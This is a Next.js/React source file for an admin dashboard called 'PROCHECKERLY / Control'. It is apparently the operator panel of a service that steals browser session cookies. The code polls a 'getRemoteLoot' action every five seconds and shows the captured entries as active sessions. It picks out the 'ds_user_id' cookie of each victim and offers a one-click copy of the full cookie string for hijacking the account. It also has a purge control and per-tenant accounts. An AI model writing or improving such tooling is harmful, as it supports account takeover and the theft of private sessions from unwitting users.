"use client";
import { useEffect, useState, useCallback, useMemo } from "react";
import { createBrowserClient } from "@supabase/ssr";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import { PurgeButton } from "@/components/PurgeButton";
import { LogOut, Activity, Database } from "lucide-react";
import { getRemoteLoot, logout, purgeRemoteLoot } from "./actions";

// Helper to generate a consistent color from a string (UID)
const getIdentityColor = (uid: string) => {
  const colors = [
    "text-blue-500 bg-blue-500/10 border-blue-500/20",
    "text-emerald-500 bg-emerald-500/10 border-emerald-500/20",
    "text-purple-500 bg-purple-500/10 border-purple-500/20",
    "text-amber-500 bg-amber-500/10 border-amber-500/20",
    "text-rose-500 bg-rose-500/10 border-rose-500/20",
    "text-cyan-500 bg-cyan-500/10 border-cyan-500/20",
  ];
  let hash = 0;
  for (let i = 0; i < uid.length; i++) {
    hash = uid.charCodeAt(i) + ((hash << 5) - hash);
  }
  return colors[Math.abs(hash) % colors.length];
};

export default function AdminDashboard() {
  const [loot, setLoot] = useState<any[]>([]);
  const [profile, setProfile] = useState<{ tenant_id: string } | null>(null);

  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
  );

  const totalCaptured = useMemo(() => loot.length, [loot]);

  const fetchData = useCallback(async () => {
    try {
      const data = await getRemoteLoot();
      if (data && Array.isArray(data)) {
        setLoot([...data].reverse());
      } else {
        setLoot([]);
      }

      if (!profile) {
        const {
          data: { user },
        } = await supabase.auth.getUser();
        if (user) {
          const { data: profileData } = await supabase
            .from("profiles")
            .select("tenant_id")
            .single();
          setProfile({
            tenant_id: user.user_metadata?.tenant_id || profileData?.tenant_id,
          });
        }
      }
    } catch (err) {
      console.error("Dashboard Sync Error:", err);
    }
  }, [profile, supabase]);

  const handlePurge = async () => {
    if (!confirm("CONFIRM DATA WIPE?")) return;
    const result = await purgeRemoteLoot();
    if (result.success) {
      setLoot([]);
      fetchData();
    } else {
      alert("WIPE FAILED");
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, [fetchData]);

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-mono p-4 md:p-12">
      <header className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-8 md:mb-16 max-w-6xl mx-auto">
        <div>
          <div className="flex items-center gap-4">
            <h1 className="text-white text-xl font-bold tracking-tighter">
              PROCHECKERLY{" "}
              <span className="text-zinc-600 font-light">/ Control</span>
            </h1>
            {totalCaptured > 0 && (
              <div className="flex items-center gap-2 px-2 py-1 bg-blue-500/10 border border-blue-500/20 rounded text-[10px] text-blue-500 font-bold animate-pulse">
                <Activity size={10} />
                {totalCaptured} ACTIVE SESSIONS
              </div>
            )}
          </div>
          <p className="text-[9px] uppercase tracking-[0.3em] text-blue-900 mt-1 font-bold">
            User: {profile?.tenant_id || "INITIALIZING..."}
          </p>
        </div>

        <div className="flex items-center gap-3 w-full md:w-auto">
          <PurgeButton onPurge={handlePurge} />
          <button
            onClick={() => logout()}
            className="flex-1 md:flex-none flex items-center justify-center gap-2 px-4 py-2 bg-zinc-900 hover:bg-red-950/20 text-zinc-500 hover:text-red-500 border border-zinc-800 rounded transition-all text-[10px] uppercase font-bold tracking-widest">
            <LogOut size={12} />
            Disconnect
          </button>
        </div>
      </header>

      <main className="max-w-6xl mx-auto">
        <div className="rounded-lg border border-zinc-900 bg-zinc-900/10 overflow-hidden overflow-x-auto">
          <table className="w-full text-left text-xs min-w-[600px] md:min-w-full">
            <thead className="border-b border-zinc-900 bg-zinc-900/20 text-zinc-600">
              <tr>
                <th className="px-4 md:px-6 py-4 uppercase tracking-widest text-[9px]">
                  Timestamp
                </th>
                <th className="px-4 md:px-6 py-4 uppercase tracking-widest text-[9px]">
                  UID
                </th>
                <th className="px-4 md:px-6 py-4 uppercase tracking-widest text-[9px]">
                  Status
                </th>
                <th className="px-4 md:px-6 py-4 text-right"></th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-900/50">
              <AnimatePresence mode="popLayout">
                {loot.map((item, i) => {
                  const uid =
                    item.data
                      .find((s: string) => s.includes("ds_user_id"))
                      ?.split("=")[1] || "unknown";
                  const colorClass = getIdentityColor(uid);

                  return (
                    <motion.tr
                      key={i}
                      layout
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="group hover:bg-white/[0.01]">
                      <td className="px-4 md:px-6 py-5 text-zinc-700 tabular-nums whitespace-nowrap">
                        {item.timestamp}
                      </td>
                      <td className="px-4 md:px-6 py-5">
                        <span
                          className={`px-2 py-1 rounded border text-[10px] font-bold ${colorClass}`}>
                          {item.username ? `@${item.username}` : `ID:${uid}`}
                        </span>
                      </td>
                      <td className="px-4 md:px-6 py-5">
                        <div className="flex items-center gap-2 text-zinc-500">
                          <span className="w-1 h-1 rounded-full bg-current animate-pulse" />
                          <span className="text-[10px] uppercase tracking-tighter">
                            Active
                          </span>
                        </div>
                      </td>
                      <td className="px-4 md:px-6 py-5 text-right">
                        <CopyButton data={item.data.join("; ")} />
                      </td>
                    </motion.tr>
                  );
                })}
              </AnimatePresence>
            </tbody>
          </table>

          {loot.length === 0 && (
            <div className="py-24 flex flex-col items-center justify-center gap-4 text-zinc-800 text-[10px] uppercase tracking-[0.5em] px-4">
              <Database size={24} className="opacity-20" />
              Waiting for data stream...
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
